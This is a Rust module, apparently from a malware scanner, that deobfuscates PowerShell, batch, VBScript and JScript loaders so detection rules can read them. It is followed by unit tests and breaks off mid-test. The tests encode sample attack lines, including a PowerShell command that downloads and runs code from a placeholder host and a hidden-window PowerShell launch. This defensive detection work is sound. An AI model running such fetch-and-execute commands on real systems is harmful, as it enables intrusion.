//! Seeing through script obfuscation.
//!
//! Malicious PowerShell, JScript, VBScript, batch and HTA loaders rarely spell
//! out what they do. Keywords are split into fragments (`'I'+'EX'`), broken up
//! with escape characters (``I`E`X``, `p^o^w^e^r`), built from character codes,
//! reversed or base64-encoded, and the real payload (usually a Windows program)
//! travels as a large encoded blob. The heuristic rules match text, so in the
//! detection benchmark they saw through almost none of it: 11 of 42 malicious
//! scripts were flagged.
//!
//! [`unwrap`] undoes the common tricks. It returns the recovered text, for the
//! same rules to read, and findings about the layers themselves: an embedded
//! program, a compressed payload, a large blob that decodes to no known file,
//! or obfuscation far beyond what ordinary scripts use.
//!
//! Nothing here runs the script. It only rewrites and decodes text, within
//! fixed size limits.

use base64::engine::{DecodePaddingMode, GeneralPurpose, GeneralPurposeConfig};
use base64::{alphabet, Engine};
use regex::Regex;
use std::collections::HashMap;
use std::io::Read;
use std::sync::LazyLock;

use super::heuristic_engine::{HeuristicMatch, HeuristicSeverity};

/// File types [`unwrap`] reads.
const SCRIPT_EXTS: &[&str] = &[
    "ps1", "psm1", "psd1", "bat", "cmd", "hta", "vbs", "vbe", "js", "jse", "wsf", "wsh",
];

/// Only this much of a script is unwrapped.
const MAX_TEXT: usize = 16 << 20;
/// At most this much recovered text is handed to the rules.
const MAX_RECOVERED: usize = 8 << 20;
/// Encoded blobs decoded per script.
const MAX_BLOBS: usize = 64;
/// Most bytes one compressed payload may expand to.
const MAX_INFLATED: u64 = 32 << 20;
/// Shortest base64 run worth decoding.
const MIN_BASE64: usize = 64;
/// A decoded binary this large, of no known kind, is a hidden payload.
const PAYLOAD_BYTES: usize = 64 << 10;
/// An encoded-looking token this long that nothing can decode is too.
const OPAQUE_TOKEN: usize = 100_000;
/// This much random-looking text, in lines, is encrypted data.
const RANDOM_TEXT: usize = 32 << 10;

pub fn is_script(ext: &str) -> bool {
    SCRIPT_EXTS.contains(&ext)
}

#[derive(Debug, Default)]
pub struct Unwrapped {
    /// Text recovered from the layers, for the heuristic rules.
    pub text: String,
    pub findings: Vec<HeuristicMatch>,
}

static B64: LazyLock<GeneralPurpose> = LazyLock::new(|| {
    GeneralPurpose::new(
        &alphabet::STANDARD,
        GeneralPurposeConfig::new()
            .with_decode_padding_mode(DecodePaddingMode::Indifferent)
            .with_decode_allow_trailing_bits(true),
    )
});

fn re(pattern: &str) -> Regex {
    Regex::new(pattern).expect("script layer pattern")
}

/// `'ab'+'cd'`, `"ab" & "cd"`, and VBScript's `"ab" & _` line continuation.
static JOIN: LazyLock<Regex> =
    LazyLock::new(|| re(r#"'[ \t]*\+[ \t]*'|"[ \t]*[+&][ \t]*(_[ \t]*\r?\n[ \t]*)?""#));
/// A PowerShell backtick inside a word that isn't an escape (`n, `t, ...).
static TICK: LazyLock<Regex> = LazyLock::new(|| re(r"([A-Za-z])`([A-Zcdg-mo-qswx-z])"));
/// A batch caret inside a word.
static CARET: LazyLock<Regex> = LazyLock::new(|| re(r"([A-Za-z])\^+([A-Za-z])"));
/// Batch substring expansion: %var:~3,1%.
/// Variable names can be any characters but %, space and colon; Koadic's
/// obfuscator uses Chinese ones.
static ENV_SUBSTRING: LazyLock<Regex> = LazyLock::new(|| re(r"%[^%\s:]{1,40}:~-?\d+(,-?\d+)?%"));
/// Any batch variable expansion, %name%.
static BATCH_VAR: LazyLock<Regex> = LazyLock::new(|| re(r"%[^%\s]{1,40}%"));
static BXOR: LazyLock<Regex> = LazyLock::new(|| re(r"(?i)-bxor\b"));
/// javascript-obfuscator's string-table lookups: q(0x152), _0x3a1f(0x1d).
static HEX_LOOKUP: LazyLock<Regex> = LazyLock::new(|| re(r"\(\s*0x[0-9a-fA-F]{2,4}\s*\)"));
static NON_ASCII_RUN: LazyLock<Regex> = LazyLock::new(|| re(r"[^\x00-\x7F]{4,40}"));
static U_ESCAPE: LazyLock<Regex> = LazyLock::new(|| re(r"\\u[0-9a-fA-F]{4}"));
/// A string built up piece by piece: `X = X & "..."`, `$x += '...'`,
/// `x = x + "..."`.
static ACCUMULATE: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r#"(?m)^[ \t]*(\$?[A-Za-z_]\w*)[ \t]*(?:\+=|=[ \t]*(\$?[A-Za-z_]\w*)[ \t]*[&+])[ \t]*(?:"([^"\r\n]*)"|'([^'\r\n]*)')"#,
    )
});
/// `.split("marker").join("")`: filler removed at run time.
static SPLIT_JOIN: LazyLock<Regex> = LazyLock::new(|| {
    re(r#"\.split\(\s*['"]([^'"\r\n]{1,40})['"]\s*\)\s*\.join\(\s*(?:''|"")\s*\)"#)
});
/// One character code: [char]80, [char]0x50, Chr(80), ChrW(80).
static CHAR_CODE: LazyLock<Regex> = LazyLock::new(|| {
    re(r"(?i)\[char\]\s*\(?\s*(0x[0-9a-f]{1,4}|\d{1,5})\s*\)?|\bchrw?\s*\(\s*(\d{1,5})\s*\)")
});
/// A run of them joined with + , or &.
static CHAR_CODE_RUN: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"(?i)(?:(?:\[char\]\s*\(?\s*(?:0x[0-9a-f]{1,4}|\d{1,5})\s*\)?|\bchrw?\s*\(\s*\d{1,5}\s*\))\s*[+,&]?\s*){4,}",
    )
});
static FROM_CHAR_CODE: LazyLock<Regex> = LazyLock::new(|| {
    re(r"(?i)fromCharCode\s*\(\s*((?:0x[0-9a-f]+|\d+)(?:\s*,\s*(?:0x[0-9a-f]+|\d+))*)\s*\)")
});
/// Lists of numbers that may be bytes or character codes.
static NUMBER_LIST: LazyLock<Regex> = LazyLock::new(|| {
    re(r"(?i)(?:(?:0x[0-9a-f]{1,2}|\d{1,3})\s*,\s*){16,}(?:0x[0-9a-f]{1,2}|\d{1,3})\b")
});
static BASE64_RUN: LazyLock<Regex> = LazyLock::new(|| re(r"[A-Za-z0-9+/]{64,}={0,2}"));
static HEX_RUN: LazyLock<Regex> =
    LazyLock::new(|| re(r"(?:[0-9A-Fa-f]{2}){64,}|(?:[0-9A-Fa-f]{2}[-:]){63,}[0-9A-Fa-f]{2}"));
/// String literals, for reversing and for joining chunked payloads.
static LITERAL: LazyLock<Regex> = LazyLock::new(|| re(r#""([^"\r\n]{8,})"|'([^'\r\n]{8,})'"#));
/// `.Replace('#','A')`, `-replace '!','A'`, `Replace(s, "@", "A")`: swaps
/// used to break base64 up, and filler strings removed at run time.
static REPLACE: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r#"(?i)(?:-replace|\breplace\s*\((?:[^,()\r\n]{0,60},)?)\s*\(?\s*['"]\\?([^'"\r\n]{1,40})['"]\s*,\s*['"]([^'"\r\n]{0,3})['"]"#,
    )
});
static REVERSAL: LazyLock<Regex> = LazyLock::new(|| {
    re(r"(?i)\bStrReverse\b|\.reverse\s*\(\s*\)|\[array\]::reverse|\[-1\s*\.\.\s*-|\bRightToLeft\b")
});
static INFLATE_HINT: LazyLock<Regex> =
    LazyLock::new(|| re(r"(?i)DeflateStream|inflateRaw|\binflate\b|IO\.Compression"));

/// Undo the obfuscation in `text`, a script of type `ext`.
pub fn unwrap(text: &str, ext: &str) -> Unwrapped {
    let text = clip(text, MAX_TEXT);
    let mut out = Unwrapped::default();
    let mut found = Found::default();

    // 1. Put split keywords back together.
    let powershell = matches!(ext, "ps1" | "psm1" | "psd1");
    let batch = matches!(ext, "bat" | "cmd");
    let joins = JOIN.find_iter(text).count();
    let ticks = if powershell {
        TICK.find_iter(text).count()
    } else {
        0
    };
    let carets = if batch {
        CARET.find_iter(text).count()
    } else {
        0
    };
    let substrings = if batch {
        ENV_SUBSTRING.find_iter(text).count()
    } else {
        0
    };
    let char_codes = CHAR_CODE.find_iter(text).count();

    let mut normal = std::borrow::Cow::Borrowed(text);
    if joins > 0 {
        normal = JOIN.replace_all(&normal, "").into_owned().into();
    }
    if ticks > 0 {
        normal = drop_inside_words(&normal, b'`', |c| {
            c.is_ascii_uppercase() || b"cdghijklmopqswxyz".contains(&c)
        })
        .into();
    }
    if carets > 0 {
        normal = drop_inside_words(&normal, b'^', |c| c.is_ascii_alphabetic()).into();
    }
    if !matches!(normal, std::borrow::Cow::Borrowed(_)) {
        out.push_text(&normal);
    }

    // Strings built up piece by piece, put back together.
    let mut built: Vec<(String, Vec<String>)> = Vec::new();
    for c in ACCUMULATE.captures_iter(&normal) {
        let name = &c[1];
        if c.get(2)
            .is_some_and(|other| !other.as_str().eq_ignore_ascii_case(name))
        {
            continue;
        }
        let piece = c.get(3).or(c.get(4)).map_or("", |m| m.as_str()).to_string();
        if let Some(i) = built.iter().position(|(n, _)| n.eq_ignore_ascii_case(name)) {
            built[i].1.push(piece);
        } else if built.len() < 256 {
            built.push((name.to_string(), vec![piece]));
        }
    }
    let most_pieces = built.iter().map(|(_, p)| p.len()).max().unwrap_or(0);
    let assembled: Vec<String> = built
        .into_iter()
        .filter(|(_, p)| p.len() >= 8)
        .map(|(_, p)| p.concat())
        .collect();
    for a in &assembled {
        out.push_text(a);
    }

    // 2. Character codes and number lists.
    for m in CHAR_CODE_RUN.find_iter(&normal) {
        let s: String = CHAR_CODE
            .captures_iter(m.as_str())
            .filter_map(|c| c.get(1).or(c.get(2)).and_then(|v| number(v.as_str())))
            .filter_map(char::from_u32)
            .collect();
        out.push_text(&s);
    }
    for c in FROM_CHAR_CODE.captures_iter(&normal) {
        let s: String = c[1]
            .split(',')
            .filter_map(|v| number(v.trim()))
            .filter_map(char::from_u32)
            .collect();
        out.push_text(&s);
    }
    for m in NUMBER_LIST.find_iter(&normal).take(MAX_BLOBS) {
        let bytes: Vec<u8> = m
            .as_str()
            .split(',')
            .filter_map(|v| number(v.trim()))
            .filter_map(|n| u8::try_from(n).ok())
            .collect();
        inspect(&bytes, &mut out, &mut found, false, 0);
    }

    // 3. Encoded blobs: as written, with any single-character swaps undone,
    // reversed, and with chunked literals joined back up. Those last three
    // are guesses: decoding the wrong way turns ordinary data into noise, so
    // from them only definite finds count (a program, compressed data,
    // text), never "a large blob of unknown bytes".
    let inflate_hint = INFLATE_HINT.is_match(&normal);
    let mut views: Vec<std::borrow::Cow<str>> = vec![normal.clone()];
    // Encoded data written as many short lines (a here-string), and the
    // strings built up above, are as written too.
    let mut written = vec![0];
    for stack in stacked_base64(&normal) {
        written.push(views.len());
        views.push(stack.into());
    }
    for a in &assembled {
        written.push(views.len());
        views.push(a.clone().into());
    }
    let swaps: Vec<(String, String)> = REPLACE
        .captures_iter(&normal)
        .map(|c| (c[1].to_string(), c[2].to_string()))
        .chain(
            SPLIT_JOIN
                .captures_iter(&normal)
                .map(|c| (c[1].to_string(), String::new())),
        )
        .filter(|(from, _)| !from.is_empty())
        .take(8)
        .collect();
    if !swaps.is_empty() {
        let swap = |s: &str| {
            let mut s = s.to_string();
            for (from, to) in &swaps {
                s = s.replace(from.as_str(), to);
            }
            s
        };
        // Removing filler reveals code, so the rules read the result.
        for a in &assembled {
            out.push_text(&swap(a));
        }
        let swapped = swap(&normal);
        out.push_text(&swapped);
        views.push(swapped.into());
    }
    if REVERSAL.is_match(&normal) {
        for view in views.clone() {
            let reversed: String = view.chars().rev().collect();
            for lit in literals(&reversed).take(4096) {
                out.push_text(lit);
            }
            views.push(reversed.into());
        }
    }
    // Payloads split into many small literals, joined back up. Each view
    // has its own blob limit, so the pieces can't use it up.
    let joined: String = literals(&normal)
        .filter(|l| l.len() >= 16 && l.bytes().all(is_base64_byte))
        .collect();
    if joined.len() >= MIN_BASE64 * 4 {
        views.push(joined.into());
    }

    for (i, view) in views.iter().enumerate() {
        let payload_before = found.payload;
        let mut blobs = 0;
        for m in BASE64_RUN.find_iter(view) {
            if blobs >= MAX_BLOBS {
                break;
            }
            blobs += 1;
            if let Some(bytes) = base64_decode(m.as_str()) {
                inspect(&bytes, &mut out, &mut found, inflate_hint, 0);
            }
        }
        for m in HEX_RUN.find_iter(view) {
            if blobs >= MAX_BLOBS {
                break;
            }
            blobs += 1;
            let digits: String = m
                .as_str()
                .chars()
                .filter(|c| c.is_ascii_hexdigit())
                .collect();
            if let Ok(bytes) = hex::decode(digits) {
                inspect(&bytes, &mut out, &mut found, inflate_hint, 0);
            }
        }
        if !written.contains(&i) {
            found.payload = payload_before;
        }
    }

    // 4. A long encoded-looking token that nothing above could read, and
    // encoded data hidden in random-looking or noise-padded text.
    if !found.readable {
        if let Some(len) = longest_dense_token(text) {
            found.opaque = Some(len);
        }
    }
    let (random_bytes, noisy_bytes) = hidden_text(text);

    // 5. Findings.
    if found.program {
        out.finding(
            "SCRIPT_501",
            "Script carries a program",
            "Contains an encoded Windows or Linux program (a dropper or loader)",
            HeuristicSeverity::High,
        );
    }
    if let Some(inner) = found.compressed {
        out.finding(
            "SCRIPT_502",
            "Script carries a compressed payload",
            &format!("Contains compressed data that unpacks to {inner}"),
            HeuristicSeverity::Medium,
        );
    }
    if let Some(n) = found.payload {
        out.finding(
            "SCRIPT_503",
            "Script hides a large encoded payload",
            &format!(
                "Contains {} KB of encoded binary data of no known file type",
                n >> 10
            ),
            HeuristicSeverity::Medium,
        );
    } else if noisy_bytes >= OPAQUE_TOKEN / 2 {
        out.finding(
            "SCRIPT_503",
            "Script hides a large encoded payload",
            &format!(
                "Contains a {} KB string padded with noise characters",
                noisy_bytes >> 10
            ),
            HeuristicSeverity::Medium,
        );
    } else if random_bytes >= RANDOM_TEXT {
        out.finding(
            "SCRIPT_503",
            "Script hides a large encoded payload",
            &format!(
                "Contains {} KB of random-looking text lines (encrypted data)",
                random_bytes >> 10
            ),
            HeuristicSeverity::Medium,
        );
    } else if let Some(n) = found.opaque {
        out.finding(
            "SCRIPT_503",
            "Script hides a large encoded payload",
            &format!(
                "Contains a {} KB encoded string that doesn't decode to text or a known file type",
                n >> 10
            ),
            HeuristicSeverity::Medium,
        );
    }
    let len_kb = (text.len() >> 10).max(1);
    let mut tricks = Vec::new();
    if joins >= 100 && joins / len_kb >= 1 {
        tricks.push(format!("{joins} split strings"));
    }
    if ticks >= 20 {
        tricks.push(format!("{ticks} backticks inside words"));
    }
    if carets >= 30 {
        tricks.push(format!("{carets} carets inside words"));
    }
    if substrings >= 20 {
        tricks.push(format!("{substrings} variable substrings"));
    }
    if char_codes >= 50 {
        tricks.push(format!("{char_codes} character codes"));
    }
    if powershell {
        let n = BXOR.find_iter(text).count();
        if n >= 50 {
            tricks.push(format!("{n} XOR operations"));
        }
    }
    if batch {
        let n = BATCH_VAR.find_iter(text).count();
        if n >= 1000 {
            tricks.push(format!("{n} variable expansions"));
        }
    }
    let n = HEX_LOOKUP.find_iter(text).count();
    if n >= 50 {
        tricks.push(format!("{n} hex-indexed string lookups"));
    }
    // Filler repeated thousands of times, over a good part of the file.
    // Libraries repeat localised strings or codepage tables a few hundred
    // times (date-fns locales, xlsx's cpexcel).
    let (filler, filler_bytes) = most_repeated(NON_ASCII_RUN.find_iter(text).map(|m| m.as_str()))
        .max(most_repeated(U_ESCAPE.find_iter(text).map(|m| m.as_str())));
    if filler >= 1000 && filler_bytes * 10 >= text.len() {
        tricks.push(format!("the same filler repeated {filler} times"));
    }
    // Only VBScript: JavaScript and PowerShell code generators build output
    // with `out += '...'` hundreds of times (ajv).
    if matches!(ext, "vbs" | "vbe" | "wsf" | "hta") && most_pieces >= 100 {
        tricks.push(format!("a string built from {most_pieces} pieces"));
    }
    if !tricks.is_empty() {
        out.finding(
            "SCRIPT_504",
            "Heavily obfuscated script",
            &format!("Hides its code with {}", tricks.join(", ")),
            HeuristicSeverity::Medium,
        );
    }
    out
}

/// What the decoded layers turned out to hold.
#[derive(Default)]
struct Found {
    program: bool,
    /// What a compressed payload unpacked to.
    compressed: Option<&'static str>,
    /// Size of a large binary of no known kind.
    payload: Option<usize>,
    /// Some blob decoded to text or a known file type.
    readable: bool,
    opaque: Option<usize>,
}

/// Look at decoded bytes: a program, compressed data, text, or something else.
fn inspect(bytes: &[u8], out: &mut Unwrapped, found: &mut Found, inflate_hint: bool, depth: u8) {
    if bytes.len() < 16 {
        return;
    }
    if is_program(bytes) {
        found.program = true;
        found.readable = true;
        return;
    }
    if depth < 2 {
        if let Some(inner) = decompress(bytes, inflate_hint) {
            let before = found.program;
            found.readable = true;
            inspect(&inner, out, found, inflate_hint, depth + 1);
            let kind = if found.program && !before {
                "a program"
            } else if text_of(&inner).is_some() {
                "script or text"
            } else {
                "binary data"
            };
            found.compressed.get_or_insert(kind);
            return;
        }
    }
    if bytes.starts_with(b"PK\x03\x04") {
        // Libraries embed zip templates (xlsx carries a spreadsheet); a zip
        // holding a program or script is a dropper's payload.
        found.readable = true;
        found.program |= zip_names(bytes).iter().any(|n| runnable_name(n));
        return;
    }
    if let Some(text) = text_of(bytes) {
        found.readable = true;
        out.push_text(&text);
        // A decoded stage often carries the next one. A source map doesn't:
        // its "mappings" field is base64-like but decodes to noise, which
        // looked like a hidden payload (jQuery's bundled sinon.js).
        if depth < 2 && !is_source_map(&text) {
            for m in BASE64_RUN.find_iter(&text).take(8) {
                if let Some(next) = base64_decode(m.as_str()) {
                    inspect(&next, out, found, inflate_hint, depth + 1);
                }
            }
        }
        return;
    }
    if is_media(bytes) {
        found.readable = true;
        return;
    }
    if bytes.len() >= PAYLOAD_BYTES {
        found.payload = Some(found.payload.unwrap_or(0).max(bytes.len()));
    }
}

/// A JavaScript source map (`{"version":3,...`).
fn is_source_map(text: &str) -> bool {
    let head: String = text
        .trim_start_matches('\u{FEFF}')
        .chars()
        .take(64)
        .filter(|c| !c.is_whitespace())
        .collect();
    head.starts_with("{\"version\":3")
}

/// A Windows (MZ + PE header or DOS stub text) or Linux (ELF) program.
fn is_program(b: &[u8]) -> bool {
    if b.starts_with(b"\x7fELF") && b.len() >= 52 {
        return true;
    }
    if !b.starts_with(b"MZ") || b.len() < 64 {
        return false;
    }
    let lfanew = u32::from_le_bytes([b[0x3C], b[0x3D], b[0x3E], b[0x3F]]) as usize;
    if b.get(lfanew..lfanew + 4) == Some(b"PE\0\0") {
        return true;
    }
    // A chunk of a payload split across strings may end before the PE header.
    let head = &b[..b.len().min(256)];
    head.windows(12).any(|w| w == b"This program")
}

/// Base64 written as runs of short lines (a here-string, or one quoted line
/// each), joined into one string per run.
fn stacked_base64(text: &str) -> Vec<String> {
    let mut stacks = Vec::new();
    let mut run = String::new();
    let mut lines = 0;
    let mut flush = |run: &mut String, lines: &mut usize| {
        if *lines >= 8 && run.len() >= MIN_BASE64 * 4 && stacks.len() < 16 {
            stacks.push(std::mem::take(run));
        }
        run.clear();
        *lines = 0;
    };
    for line in text.lines() {
        let core = line
            .trim()
            .trim_end_matches(['+', '&', '_', ';', ',', ' ', '\t'])
            .trim_matches(['"', '\'']);
        if core.len() >= 40 && core.bytes().all(is_base64_byte) {
            run.push_str(core);
            lines += 1;
        } else {
            flush(&mut run, &mut lines);
        }
    }
    flush(&mut run, &mut lines);
    stacks
}

/// Bytes of text in lines that look like encrypted data (high entropy, not
/// base64, which is decoded instead), and in very long lines padded with
/// noise characters (`~!#$%^&*?`).
fn hidden_text(text: &str) -> (usize, usize) {
    let (mut random, mut noisy) = (0, 0);
    for line in text.lines() {
        let core = line
            .trim_start()
            .trim_start_matches(['\'', '#', '/', ';'])
            .trim_start_matches("REM ")
            .trim_matches(['"', '\'', ' ']);
        let b = core.as_bytes();
        if b.len() >= 50_000 {
            let noise = b.iter().filter(|c| b"~!#$%^&*?".contains(c)).count();
            if noise * 4 >= b.len() {
                noisy += b.len();
                continue;
            }
        }
        if b.len() < 100 || b.len() > 4096 {
            continue;
        }
        let spaces = b.iter().filter(|&&c| c == b' ').count();
        let other = b.iter().filter(|&&c| !is_base64_byte(c)).count();
        if spaces * 33 <= b.len() && other * 10 >= b.len() && entropy(b) >= 5.9 {
            random += b.len();
        }
    }
    (random, noisy)
}

/// Shannon entropy in bits per byte.
fn entropy(b: &[u8]) -> f64 {
    let mut counts = [0u32; 256];
    for &c in b {
        counts[c as usize] += 1;
    }
    let n = b.len() as f64;
    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

/// How often the most common item occurs, and the bytes it takes up.
fn most_repeated<'a>(items: impl Iterator<Item = &'a str>) -> (usize, usize) {
    let mut counts: HashMap<&str, usize> = HashMap::new();
    for i in items {
        *counts.entry(i).or_default() += 1;
    }
    counts
        .into_iter()
        .max_by_key(|&(_, n)| n)
        .map_or((0, 0), |(s, n)| (n, n * s.len()))
}

/// The file names in a zip's local headers.
fn zip_names(b: &[u8]) -> Vec<String> {
    let mut names = Vec::new();
    let mut i = 0;
    while names.len() < 1000 && b.get(i..i + 4) == Some(b"PK\x03\x04") {
        let Some(h) = b.get(i..i + 30) else { break };
        let le16 = |o: usize| u16::from_le_bytes([h[o], h[o + 1]]) as usize;
        let size = u32::from_le_bytes([h[18], h[19], h[20], h[21]]) as usize;
        let (name_len, extra_len) = (le16(26), le16(28));
        let Some(name) = b.get(i + 30..i + 30 + name_len) else {
            break;
        };
        names.push(String::from_utf8_lossy(name).into_owned());
        // Entries written with a data descriptor give no size here.
        if size == 0 && h[6] & 0x08 != 0 {
            break;
        }
        i += 30 + name_len + extra_len + size;
    }
    names
}

fn runnable_name(name: &str) -> bool {
    const EXTS: &[&str] = &[
        "exe", "dll", "scr", "com", "pif", "cpl", "msi", "sys", "ps1", "vbs", "vbe", "js", "jse",
        "wsf", "hta", "bat", "cmd", "lnk",
    ];
    name.rsplit_once('.')
        .is_some_and(|(_, e)| EXTS.contains(&e.to_ascii_lowercase().as_str()))
}

fn decompress(b: &[u8], inflate_hint: bool) -> Option<Vec<u8>> {
    // Keep what was unpacked even if the stream ends early: a payload cut
    // off or with a damaged checksum still shows what it is.
    let read = |r: Box<dyn Read + '_>| -> Option<Vec<u8>> {
        let mut out = Vec::new();
        let mut r = r.take(MAX_INFLATED);
        let mut buf = [0u8; 16384];
        while let Ok(n) = r.read(&mut buf) {
            if n == 0 {
                break;
            }
            out.extend_from_slice(&buf[..n]);
        }
        (out.len() >= 16).then_some(out)
    };
    if b.starts_with(&[0x1F, 0x8B, 0x08]) {
        return read(Box::new(flate2::read::GzDecoder::new(b)));
    }
    if b[0] == 0x78 && matches!(b[1], 0x01 | 0x5E | 0x9C | 0xDA) {
        return read(Box::new(flate2::read::ZlibDecoder::new(b)));
    }
    // Raw deflate has no header; only try it when the script inflates
    // something, and only trust output that is itself recognisable.
    if inflate_hint && !is_media(b) {
        let out = read(Box::new(flate2::read::DeflateDecoder::new(b)))?;
        if out.len() > b.len() && (is_program(&out) || text_of(&out).is_some()) {
            return Some(out);
        }
    }
    None
}

/// Decoded bytes as text: UTF-16LE (PowerShell's -EncodedCommand) or
/// mostly-printable UTF-8.
fn text_of(b: &[u8]) -> Option<String> {
    let sample = &b[..b.len().min(4096)];
    let odd_zero = sample
        .iter()
        .skip(1)
        .step_by(2)
        .filter(|&&c| c == 0)
        .count();
    if sample.len() >= 8 && odd_zero * 10 >= (sample.len() / 2) * 9 {
        let units: Vec<u16> = b
            .as_chunks::<2>()
            .0
            .iter()
            .map(|p| u16::from_le_bytes([p[0], p[1]]))
            .collect();
        let s = String::from_utf16_lossy(&units);
        return printable(s.as_bytes()).then_some(s);
    }
    let start = b.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(b);
    printable(start).then(|| String::from_utf8_lossy(start).into_owned())
}

fn printable(b: &[u8]) -> bool {
    let sample = &b[..b.len().min(4096)];
    if sample.is_empty() {
        return false;
    }
    let ok = sample
        .iter()
        .filter(|&&c| matches!(c, b'\t' | b'\n' | b'\r' | 0x20..=0x7E) || c >= 0x80)
        .count();
    let high = sample.iter().filter(|&&c| c >= 0x80).count();
    ok * 100 >= sample.len() * 95 && high * 10 <= sample.len()
}

/// Images, fonts, WebAssembly, audio, video and PDFs: what legitimate pages
/// and libraries embed as base64.
fn is_media(b: &[u8]) -> bool {
    const MAGIC: &[&[u8]] = &[
        b"\x89PNG",
        b"\xFF\xD8\xFF",
        b"GIF8",
        b"wOFF",
        b"wOF2",
        b"\0\x01\0\0",
        b"OTTO",
        b"\0asm",
        b"RIFF",
        b"ID3",
        b"%PDF",
        b"BM",
        b"\0\0\x01\0",
        b"OggS",
        b"fLaC",
        b"\x1A\x45\xDF\xA3",
        b"<svg",
        b"<?xml",
    ];
    MAGIC.iter().any(|m| b.starts_with(m)) || b.get(4..8) == Some(b"ftyp")
}

fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let s = s.trim_end_matches('=');
    // A lone trailing character can't be decoded; two or three can.
    let s = if s.len() % 4 == 1 {
        &s[..s.len() - 1]
    } else {
        s
    };
    B64.decode(s).ok()
}

/// `text` without `mark` where it sits between a letter and a character
/// `next` accepts (``I`E`X`` and `p^o^w^e^r`). Runs of the mark go too.
fn drop_inside_words(text: &str, mark: u8, next: impl Fn(u8) -> bool) -> String {
    let b = text.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == mark && out.last().is_some_and(|c: &u8| c.is_ascii_alphabetic()) {
            let mut j = i;
            while j < b.len() && b[j] == mark {
                j += 1;
            }
            if j < b.len() && next(b[j]) {
                i = j;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    // Only ASCII marks are removed, so the result is still UTF-8.
    String::from_utf8(out).unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned())
}

fn is_base64_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=')
}

fn number(s: &str) -> Option<u32> {
    match s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        Some(h) => u32::from_str_radix(h, 16).ok(),
        None => s.parse().ok(),
    }
}

fn literals(text: &str) -> impl Iterator<Item = &str> {
    LITERAL
        .captures_iter(text)
        .filter_map(|c| c.get(1).or(c.get(2)).map(|m| m.as_str()))
}

/// Length of the longest run of base64-like characters (letters, digits and
/// the symbols used as stand-ins), if one is long enough to be a payload.
fn longest_dense_token(text: &str) -> Option<usize> {
    let mut best = 0;
    let mut run = 0;
    let mut alnum = 0;
    let mut best_alnum = 0;
    for b in text.bytes() {
        if b.is_ascii_alphanumeric() || b"+/=!@#$%*_-~.|".contains(&b) {
            run += 1;
            alnum += usize::from(b.is_ascii_alphanumeric());
            if run > best {
                best = run;
                best_alnum = alnum;
            }
        } else {
            run = 0;
            alnum = 0;
        }
    }
    (best >= OPAQUE_TOKEN && best_alnum * 100 >= best * 90).then_some(best)
}

fn clip(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut end = max;
    while !text.is_char_boundary(end) {
        end -= 1;
    }
    &text[..end]
}

impl Unwrapped {
    fn push_text(&mut self, s: &str) {
        let room = MAX_RECOVERED.saturating_sub(self.text.len());
        if room == 0 || s.is_empty() {
            return;
        }
        self.text.push_str(clip(s, room));
        self.text.push('\n');
    }

    fn finding(&mut self, id: &str, name: &str, description: &str, severity: HeuristicSeverity) {
        self.findings.push(HeuristicMatch {
            rule_id: id.to_string(),
            rule_name: name.to_string(),
            description: description.to_string(),
            severity,
            confidence: 0.8,
            matched_content: None,
            offset: None,
            context: HashMap::new(),
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn ids(u: &Unwrapped) -> Vec<&str> {
        u.findings.iter().map(|f| f.rule_id.as_str()).collect()
    }

    /// A minimal MZ/PE header: enough for `is_program`, and not runnable.
    fn fake_program(size: usize) -> Vec<u8> {
        let mut b = vec![0u8; size.max(256)];
        b[..2].copy_from_slice(b"MZ");
        b[0x3C] = 0x80;
        b[0x80..0x84].copy_from_slice(b"PE\0\0");
        b
    }

    fn b64(b: &[u8]) -> String {
        base64::engine::general_purpose::STANDARD.encode(b)
    }

    fn gzip(b: &[u8]) -> Vec<u8> {
        let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        e.write_all(b).unwrap();
        e.finish().unwrap()
    }

    #[test]
    fn split_and_escaped_keywords_are_joined() {
        let u = unwrap("$x = 'Inv'+'oke-Ex'+'pression'; I`E`X $y", "ps1");
        assert!(u.text.contains("Invoke-Expression"), "{}", u.text);
        assert!(u.text.contains("IEX $y"));
        let u = unwrap("Set s = CreateObject(\"WScript.\" & \"Shell\")", "vbs");
        assert!(u.text.contains("CreateObject(\"WScript.Shell\")"));
        let u = unwrap("p^o^w^e^r^s^h^e^l^l -w hidden", "bat");
        assert!(u.text.contains("powershell -w hidden"));
        // Escapes stay as they are.
        assert!(unwrap("Write-Host \"a`nb`tc\"", "ps1").text.is_empty());
    }

    #[test]
    fn character_codes_are_decoded() {
        let u = unwrap("$c = [char]73+[char]69+[char]88+[char]32+[char]0x24", "ps1");
        assert!(u.text.contains("IEX $"), "{}", u.text);
        let u = unwrap(
            "x = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105)",
            "vbs",
        );
        assert!(u.text.contains("WScri"));
        let u = unwrap("eval(String.fromCharCode(97,108,101,114,116))", "js");
        assert!(u.text.contains("alert"));
    }

    #[test]
    fn an_encoded_command_is_decoded() {
        let cmd: Vec<u8> = "IEX (New-Object Net.WebClient).DownloadString('http://x')"
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let u = unwrap(&format!("powershell -enc {}", b64(&cmd)), "bat");
        assert!(u.text.contains("DownloadString"), "{}", u.text);
        assert!(u.findings.is_empty());
    }

    #[test]
    fn an_embedded_program_is_found_however_it_is_encoded() {
        let pe = fake_program(4096);
        let base64 = b64(&pe);
        let cases = [
            format!("$b = [Convert]::FromBase64String('{base64}')"),
            format!("$b = '{}'", base64.replace('A', "#")) + "; $b = $b.Replace('#','A')",
            format!(
                "s = StrReverse(\"{}\")",
                base64.chars().rev().collect::<String>()
            ),
            format!("$h = '{}'", hex::encode(&pe)),
